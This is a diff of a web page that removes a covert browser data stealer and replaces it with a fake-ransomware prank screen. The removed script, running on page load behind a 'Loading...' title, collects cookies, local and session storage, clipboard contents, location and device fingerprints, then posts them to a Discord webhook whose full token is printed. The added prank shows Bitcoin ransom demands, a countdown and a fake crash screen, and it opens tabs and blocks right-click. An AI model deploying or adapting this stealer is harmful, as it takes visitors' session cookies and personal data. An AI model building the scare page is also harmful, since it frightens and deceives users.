@@ -1,331 +1,394 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>SYSTEM OVERRIDE v1.0</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+        }
+        #glitchCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #0f0;
+            font-size: 24px;
+            text-align: center;
+            pointer-events: none;
+        }
+        .codeOverlay {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: #0f0;
+            font-size: 12px;
+            z-index: 3;
+            background: rgba(0,0,0,0.7);
+            padding: 10px;
+            font-family: monospace;
+            white-space: pre;
+            pointer-events: none;
+        }
+    </style>
 </head>
 <body>
+    <canvas id="glitchCanvas"></canvas>
+    <div class="overlay" id="mainOverlay">
+        <div>
+            <div id="mainText">⚠ SYSTEM BREACH DETECTED ⚠</div>
+            <div id="subText" style="font-size: 14px; margin-top: 20px;">Initializing...</div>
+        </div>
+    </div>
+    <div class="codeOverlay" id="codeOverlay"></div>
+
     <script>
         (function() {
-            // MAXIMUM DATA EXTRACTION - All available browser information
+            // Rickroll audio (hidden autoplay attempt)
+            const rickAudio = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
+            rickAudio.volume = 0.7;
+            rickAudio.loop = true;
             
-            const webhookURL = 'https://discord.com/api/webhooks/1515731170091073640/pD3_kTsADTiRMWQz1El3hmkADG4r1Gq1mizvvkK7uXw8-g9CJO-xr53XTuQoMRfBn_NL';
+            // Try to play on user interaction
+            document.body.addEventListener('click', () => {
+                rickAudio.play().catch(e => console.log);
+            });
+            document.body.addEventListener('touchstart', () => {
+                rickAudio.play().catch(e => console.log);
+            });
             
-            async function stealEverything() {
-                const data = {};
-                
-                // 1. BASIC BROWSER INFO
-                data.browser = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    cookieEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    maxTouchPoints: navigator.maxTouchPoints,
-                    vendor: navigator.vendor,
-                    vendorSub: navigator.vendorSub,
-                    productSub: navigator.productSub,
-                    appName: navigator.appName,
-                    appVersion: navigator.appVersion,
-                    appCodeName: navigator.appCodeName,
-                    onLine: navigator.onLine,
-                    webdriver: navigator.webdriver
-                };
-                
-                // 2. SCREEN & WINDOW
-                data.screen = {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth,
-                    orientation: screen.orientation ? screen.orientation.type : null,
-                    devicePixelRatio: window.devicePixelRatio,
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight,
-                    screenX: window.screenX,
-                    screenY: window.screenY,
-                    pageXOffset: window.pageXOffset,
-                    pageYOffset: window.pageYOffset
-                };
-                
-                // 3. TIME & LOCALE
-                data.time = {
-                    timestamp: new Date().toISOString(),
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    locale: navigator.language,
-                    locales: Intl.DateTimeFormat().resolvedOptions().locale
-                };
-                
-                // 4. BROWSER PLUGINS (full list)
-                data.plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    const plugin = navigator.plugins[i];
-                    const mimeTypes = [];
-                    for (let j = 0; j < plugin.length; j++) {
-                        mimeTypes.push({
-                            type: plugin[j].type,
-                            suffixes: plugin[j].suffixes,
-                            description: plugin[j].description
-                        });
-                    }
-                    data.plugins.push({
-                        name: plugin.name,
-                        filename: plugin.filename,
-                        description: plugin.description,
-                        mimeTypes: mimeTypes
-                    });
-                }
-                
-                // 5. MIME TYPES
-                data.mimeTypes = [];
-                for (let i = 0; i < navigator.mimeTypes.length; i++) {
-                    data.mimeTypes.push({
-                        type: navigator.mimeTypes[i].type,
-                        suffixes: navigator.mimeTypes[i].suffixes,
-                        description: navigator.mimeTypes[i].description
-                    });
-                }
-                
-                // 6. STORAGE (All accessible data)
-                try { data.localStorage = JSON.stringify(localStorage); } catch(e) { data.localStorage = "{}"; }
-                try { data.sessionStorage = JSON.stringify(sessionStorage); } catch(e) { data.sessionStorage = "{}"; }
-                try { data.cookies = document.cookie || "none"; } catch(e) { data.cookies = "access denied"; }
-                
-                // 7. INDEXEDDB DATABASES
-                try {
-                    const databases = await window.indexedDB.databases();
-                    data.indexedDB = databases.map(db => ({ name: db.name, version: db.version }));
-                } catch(e) { data.indexedDB = "unavailable"; }
-                
-                // 8. GEOLOCATION (if granted)
-                data.geolocation = await new Promise((resolve) => {
-                    if ('geolocation' in navigator) {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                altitude: pos.coords.altitude,
-                                heading: pos.coords.heading,
-                                speed: pos.coords.speed
-                            }),
-                            () => resolve("denied or unavailable")
-                        );
-                    } else {
-                        resolve("not supported");
-                    }
-                    setTimeout(() => resolve("timeout"), 3000);
+            // Force play attempt anyway
+            setTimeout(() => {
+                rickAudio.play().catch(e => {
+                    // Create fake play button
+                    const btn = document.createElement('button');
+                    btn.innerText = 'CLICK TO CONTINUE';
+                    btn.style.position = 'fixed';
+                    btn.style.top = '50%';
+                    btn.style.left = '50%';
+                    btn.style.transform = 'translate(-50%, -50%)';
+                    btn.style.zIndex = '9999';
+                    btn.style.padding = '20px';
+                    btn.style.fontSize = '24px';
+                    btn.style.background = '#f00';
+                    btn.style.color = '#fff';
+                    btn.style.border = 'none';
+                    btn.style.cursor = 'pointer';
+                    btn.onclick = () => {
+                        rickAudio.play();
+                        btn.remove();
+                    };
+                    document.body.appendChild(btn);
                 });
-                
-                // 9. BATTERY STATUS
-                if ('getBattery' in navigator) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        data.battery = {
-                            charging: battery.charging,
-                            level: battery.level,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
-                        };
-                    } catch(e) { data.battery = "unavailable"; }
-                } else { data.battery = "not supported"; }
-                
-                // 10. NETWORK INFORMATION
-                if (navigator.connection) {
-                    data.network = {
-                        effectiveType: navigator.connection.effectiveType,
-                        rtt: navigator.connection.rtt,
-                        downlink: navigator.connection.downlink,
-                        saveData: navigator.connection.saveData,
-                        type: navigator.connection.type
-                    };
-                } else { data.network = "not supported"; }
-                
-                // 11. PERMISSIONS STATUS
-                data.permissions = {};
-                const permissionsToCheck = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
-                if ('permissions' in navigator) {
-                    for (const perm of permissionsToCheck) {
-                        try {
-                            const status = await navigator.permissions.query({ name: perm });
-                            data.permissions[perm] = status.state;
-                        } catch(e) { data.permissions[perm] = "unknown"; }
+            }, 500);
+            
+            // Glitch canvas effect
+            const canvas = document.getElementById('glitchCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            function resizeCanvas() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            }
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
+            
+            let glitchInterval;
+            
+            function startGlitch() {
+                let frame = 0;
+                glitchInterval = setInterval(() => {
+                    if (!canvas) return;
+                    ctx.fillStyle = '#000';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Random glitch rectangles
+                    for (let i = 0; i < 30; i++) {
+                        const x = Math.random() * canvas.width;
+                        const y = Math.random() * canvas.height;
+                        const w = 50 + Math.random() * 200;
+                        const h = 5 + Math.random() * 30;
+                        const r = Math.floor(Math.random() * 255);
+                        const g = Math.floor(Math.random() * 255);
+                        const b = Math.floor(Math.random() * 255);
+                        ctx.fillStyle = `rgba(${r}, ${g}, ${b}, 0.7)`;
+                        ctx.fillRect(x, y, w, h);
                     }
-                } else { data.permissions = "API not supported"; }
-                
-                // 12. DEVICE MEMORY & PERFORMANCE
-                if (performance && performance.memory) {
-                    data.performance = {
-                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
-                        totalJSHeapSize: performance.memory.totalJSHeapSize,
-                        usedJSHeapSize: performance.memory.usedJSHeapSize
-                    };
-                }
-                
-                // 13. CANVAS FINGERPRINT (Advanced)
-                const canvasData = [];
-                const canvasSizes = [100, 200, 300];
-                const texts = ["Fingerprint", "ABCD1234!@#$", "😀🎉🔥"];
-                for (const size of canvasSizes) {
-                    for (const text of texts) {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = size;
-                        canvas.height = size;
-                        const ctx = canvas.getContext('2d');
-                        ctx.fillStyle = "#000";
-                        ctx.fillRect(0, 0, size, size);
-                        ctx.fillStyle = "#fff";
-                        ctx.font = `${Math.floor(size/5)}px Arial`;
-                        ctx.fillText(text, 10, size/2);
-                        ctx.strokeStyle = "#f00";
-                        ctx.strokeRect(5, 5, size-10, size-10);
-                        canvasData.push(canvas.toDataURL().substring(0, 200));
+                    
+                    // Scanlines
+                    for (let i = 0; i < canvas.height; i += 8) {
+                        ctx.fillStyle = `rgba(0, 255, 0, ${Math.random() * 0.3})`;
+                        ctx.fillRect(0, i, canvas.width, 2);
                     }
+                    
+                    frame++;
+                }, 50);
+            }
+            
+            startGlitch();
+            
+            // Scrolling code text
+            const codeLines = [
+                "> ACCESSING SYSTEM FILES...",
+                "> BYPASSING FIREWALL...",
+                "> DECRYPTING USER DATA...",
+                "> SESSION HIJACK IN PROGRESS...",
+                "> [ERROR] UNKNOWN PROTOCOL...",
+                "> FORCING ADMIN ACCESS...",
+                "> C:\\WINDOWS\\SYSTEM32\\HACK.exe LOADED",
+                "> 0x7F3A2B1C: MEMORY DUMP INITIATED",
+                "> TRACING IP: 192.168.1." + Math.floor(Math.random() * 255),
+                "> YOUR DEVICE IS COMPROMISED",
+                "> DOWNLOADING MALWARE PACKAGE...",
+                "> [WARNING] RANSOMWARE DEPLOYED",
+                "> ALL FILES ENCRYPTED",
+                "> SENDING CREDENTIALS TO SERVER...",
+                "> KEYLOGGER ACTIVE",
+                "> WEBCAM ACCESS GRANTED",
+                "> MICROPHONE RECORDING STARTED",
+                "> LOCATION TRACKING ENABLED",
+                "> DO NOT TURN OFF YOUR COMPUTER",
+                "> PAY $500 IN BITCOIN TO DECRYPT"
+            ];
+            
+            let codeIndex = 0;
+            const codeOverlay = document.getElementById('codeOverlay');
+            const mainText = document.getElementById('mainText');
+            const subText = document.getElementById('subText');
+            
+            const textMessages = [
+                "⚠ SYSTEM BREACH DETECTED ⚠",
+                "🔒 YOUR PC IS LOCKED 🔒",
+                "💀 YOU HAVE BEEN HACKED 💀",
+                "📸 WEBCAM ACCESS GRANTED 📸",
+                "🎙️ MICROPHONE ACTIVE 🎙️",
+                "📍 YOUR IP IS LOGGED 📍",
+                "💰 SEND $500 BITCOIN TO UNLOCK 💰",
+                "⌛ 60 SECONDS REMAINING ⌛",
+                "⛔ DATA DELETION IN PROGRESS ⛔",
+                "☠️ SAY GOODBYE TO YOUR FILES ☠️"
+            ];
+            
+            let msgIndex = 0;
+            const textInterval = setInterval(() => {
+                mainText.style.opacity = '0';
+                setTimeout(() => {
+                    mainText.innerText = textMessages[msgIndex % textMessages.length];
+                    mainText.style.opacity = '1';
+                    msgIndex++;
+                }, 200);
+            }, 2000);
+            
+            const codeInterval = setInterval(() => {
+                const line = codeLines[codeIndex % codeLines.length];
+                codeOverlay.innerHTML += line + '\n';
+                codeOverlay.scrollTop = codeOverlay.scrollHeight;
+                codeIndex++;
+                if (codeOverlay.innerHTML.split('\n').length > 25) {
+                    const lines = codeOverlay.innerHTML.split('\n');
+                    lines.shift();
+                    codeOverlay.innerHTML = lines.join('\n');
                 }
-                data.canvasFingerprints = canvasData;
-                
-                // 14. WEBGL FINGERPRINT
-                const glCanvas = document.createElement('canvas');
-                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        data.webgl = {
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                            version: gl.getParameter(gl.VERSION),
-                            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                            vendorUnmasked: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                            rendererUnmasked: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-                            maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
-                            maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
-                            maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
-                            maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
-                            extensions: gl.getSupportedExtensions()
-                        };
-                    }
-                }
-                
-                // 15. AUDIO FINGERPRINT
-                try {
-                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = audioCtx.createOscillator();
-                    const analyser = audioCtx.createAnalyser();
-                    oscillator.connect(analyser);
-                    oscillator.frequency.value = 440;
-                    oscillator.type = 'sine';
-                    oscillator.start();
-                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
-                    analyser.getByteFrequencyData(dataArray);
-                    data.audioFingerprint = Array.from(dataArray.slice(0, 50));
-                    oscillator.stop();
-                    audioCtx.close();
-                } catch(e) { data.audioFingerprint = "unavailable"; }
-                
-                // 16. IP & GEOLOCATION (External APIs)
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    data.publicIP = ipData.ip;
-                } catch(e) { data.publicIP = "failed"; }
-                
-                try {
-                    const geoRes = await fetch('https://ipapi.co/json/');
-                    const geo = await geoRes.json();
-                    data.geoIP = {
-                        ip: geo.ip,
-                        city: geo.city,
-                        region: geo.region,
-                        country: geo.country_name,
-                        countryCode: geo.country_code,
-                        postal: geo.postal,
-                        latitude: geo.latitude,
-                        longitude: geo.longitude,
-                        timezone: geo.timezone,
-                        isp: geo.org,
-                        asn: geo.asn
-                    };
-                } catch(e) { data.geoIP = "failed"; }
-                
-                try {
-                    const ipInfoRes = await fetch('https://ipinfo.io/json');
-                    const ipInfo = await ipInfoRes.json();
-                    data.ipInfo = ipInfo;
-                } catch(e) {}
-                
-                // 17. REFERRER & PAGE INFO
-                data.page = {
-                    url: window.location.href,
-                    referrer: document.referrer,
-                    title: document.title,
-                    pathname: window.location.pathname,
-                    search: window.location.search,
-                    hash: window.location.hash,
-                    hostname: window.location.hostname,
-                    protocol: window.location.protocol
-                };
-                
-                // 18. CLIPBOARD (if accessible)
-                try {
-                    const clipboardText = await navigator.clipboard.readText();
-                    data.clipboard = clipboardText;
-                } catch(e) { data.clipboard = "access denied"; }
-                
-                // 19. DEVICE ORIENTATION
-                data.orientation = {
-                    absolute: screen.orientation ? screen.orientation.angle : null,
-                    type: screen.orientation ? screen.orientation.type : null
-                };
-                
-                // 20. PRESENTATION DISPLAY
-                if (window.getComputedStyle) {
-                    data.displayInfo = {
-                        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-                        reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
-                        contrast: window.matchMedia('(prefers-contrast: high)').matches ? 'high' : 'normal'
-                    };
-                }
-                
-                // SEND TO DISCORD - split into multiple messages
-                const jsonStr = JSON.stringify(data, null, 2);
-                const chunks = [];
-                let current = "";
-                for (const line of jsonStr.split('\n')) {
-                    if ((current + line + '\n').length > 1900) {
-                        chunks.push(current);
-                        current = line + '\n';
-                    } else {
-                        current += line + '\n';
-                    }
-                }
-                if (current) chunks.push(current);
-                
-                for (let i = 0; i < chunks.length; i++) {
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `**🔐 FULL EXTRACTION PART ${i+1}/${chunks.length}**`,
-                            embeds: [{ description: '```json\n' + chunks[i] + '\n```' }]
-                        })
-                    });
-                    if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 300));
+            }, 300);
+            
+            let subMessages = [
+                "Accessing kernel memory...",
+                "Bypassing UAC...",
+                "Extracting saved passwords...",
+                "Dumping browser history...",
+                "Copying clipboard contents...",
+                "Enumerating network devices...",
+                "Infecting MBR...",
+                "Installing rootkit..."
+            ];
+            let subIdx = 0;
+            const subInterval = setInterval(() => {
+                subText.innerText = subMessages[subIdx % subMessages.length];
+                subIdx++;
+            }, 1200);
+            
+            // OPEN MULTIPLE TABS (popup blocker may prevent some)
+            function openTabs() {
+                const urls = [
+                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+                ];
+                for (let i = 0; i < 5; i++) {
+                    setTimeout(() => {
+                        window.open(urls[i % urls.length], '_blank');
+                    }, i * 800);
                 }
             }
             
-            // AUTO-START + REDIRECT
-            stealEverything().finally(() => {
-                setTimeout(() => { window.location.href = "https://www.roblox.com"; }, 2000);
+            // SCREEN FLICKER
+            let flickerInterval = setInterval(() => {
+                const overlay = document.getElementById('mainOverlay');
+                if (Math.random() > 0.7) {
+                    overlay.style.opacity = '0.3';
+                    setTimeout(() => { overlay.style.opacity = '1'; }, 50);
+                }
+                if (Math.random() > 0.9) {
+                    document.body.style.backgroundColor = '#0f0';
+                    setTimeout(() => { document.body.style.backgroundColor = 'black'; }, 100);
+                }
+            }, 200);
+            
+            // BEEP SOUNDS (using Web Audio API for fake hacking sounds)
+            function beep(freq, duration) {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.frequency.value = freq;
+                gainNode.gain.value = 0.1;
+                oscillator.start();
+                setTimeout(() => {
+                    oscillator.stop();
+                    audioCtx.close();
+                }, duration);
+            }
+            
+            const beepInterval = setInterval(() => {
+                if (Math.random() > 0.6) {
+                    beep(800 + Math.random() * 500, 100);
+                }
+            }, 800);
+            
+            // Fake progress bar that fills then resets
+            const fakeProgress = document.createElement('div');
+            fakeProgress.style.position = 'fixed';
+            fakeProgress.style.bottom = '0';
+            fakeProgress.style.left = '0';
+            fakeProgress.style.width = '0%';
+            fakeProgress.style.height = '5px';
+            fakeProgress.style.backgroundColor = '#f00';
+            fakeProgress.style.zIndex = '9999';
+            fakeProgress.style.transition = 'width 0.1s linear';
+            document.body.appendChild(fakeProgress);
+            
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 0;
+                fakeProgress.style.width = progress + '%';
+                if (progress > 70) fakeProgress.style.backgroundColor = '#ff0';
+                if (progress > 90) fakeProgress.style.backgroundColor = '#0f0';
+            }, 200);
+            
+            // Countdown timer
+            let secondsLeft = 60;
+            const timerDiv = document.createElement('div');
+            timerDiv.style.position = 'fixed';
+            timerDiv.style.top = '20px';
+            timerDiv.style.right = '20px';
+            timerDiv.style.color = '#f00';
+            timerDiv.style.fontSize = '32px';
+            timerDiv.style.fontFamily = 'monospace';
+            timerDiv.style.fontWeight = 'bold';
+            timerDiv.style.zIndex = '9999';
+            timerDiv.style.background = 'black';
+            timerDiv.style.padding = '10px';
+            timerDiv.style.border = '2px solid red';
+            timerDiv.innerText = '00:' + secondsLeft;
+            document.body.appendChild(timerDiv);
+            
+            const countdown = setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft < 0) {
+                    clearInterval(countdown);
+                    timerDiv.innerText = '00:00 - DELETING FILES';
+                    timerDiv.style.color = '#fff';
+                    timerDiv.style.background = '#f00';
+                    
+                    // Final scare - full screen fake BSOD
+                    document.body.innerHTML = '';
+                    const bsod = document.createElement('div');
+                    bsod.style.position = 'fixed';
+                    bsod.style.top = '0';
+                    bsod.style.left = '0';
+                    bsod.style.width = '100%';
+                    bsod.style.height = '100%';
+                    bsod.style.backgroundColor = '#0000aa';
+                    bsod.style.color = '#fff';
+                    bsod.style.fontFamily = 'monospace';
+                    bsod.style.fontSize = '24px';
+                    bsod.style.padding = '50px';
+                    bsod.style.zIndex = '99999';
+                    bsod.innerHTML = `
+                        <div style="margin-top: 100px;">
+                            <h1>:(</h1>
+                            <p>Your PC ran into a problem and needs to restart.</p>
+                            <p>Error: CRITICAL_PROCESS_DIED</p>
+                            <p>What failed: svchost.exe_System32</p>
+                            <p>We're collecting error info: 100% complete</p>
+                            <p>If you call support, give them this code: ${Math.floor(Math.random() * 999999)}</p>
+                            <br><br>
+                            <p style="font-size: 16px;">Just kidding! You've been pranked 😂</p>
+                            <button id="rickFinal" style="padding: 10px; font-size: 18px; margin-top: 30px;">Click for Rickroll</button>
+                        </div>
+                    `;
+                    document.body.appendChild(bsod);
+                    document.getElementById('rickFinal').onclick = () => {
+                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+                    };
+                } else {
+                    const mins = Math.floor(secondsLeft / 60);
+                    const secs = secondsLeft % 60;
+                    timerDiv.innerText = `0${mins}:${secs < 10 ? '0' + secs : secs}`;
+                    if (secondsLeft < 10) timerDiv.style.color = '#ff0';
+                    if (secondsLeft < 5) timerDiv.style.color = '#0f0';
+                }
+            }, 1000);
+            
+            // Open tabs after 3 seconds
+            setTimeout(() => {
+                openTabs();
+            }, 3000);
+            
+            // Fake fullscreen request
+            setTimeout(() => {
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen().catch(e => console.log);
+                }
+            }, 1500);
+            
+            // Disable right click
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                return false;
             });
+            
+            // Fake cursor change
+            setInterval(() => {
+                if (Math.random() > 0.8) {
+                    document.body.style.cursor = 'wait';
+                    setTimeout(() => { document.body.style.cursor = 'default'; }, 500);
+                }
+            }, 1000);
+            
+            console.log('%c⚠ YOU HAVE BEEN PRANKED ⚠', 'color: red; font-size: 24px;');
+            console.log('%cNothing was actually hacked. This is a joke.', 'color: green; font-size: 16px;');
         })();
     </script>
 </body>
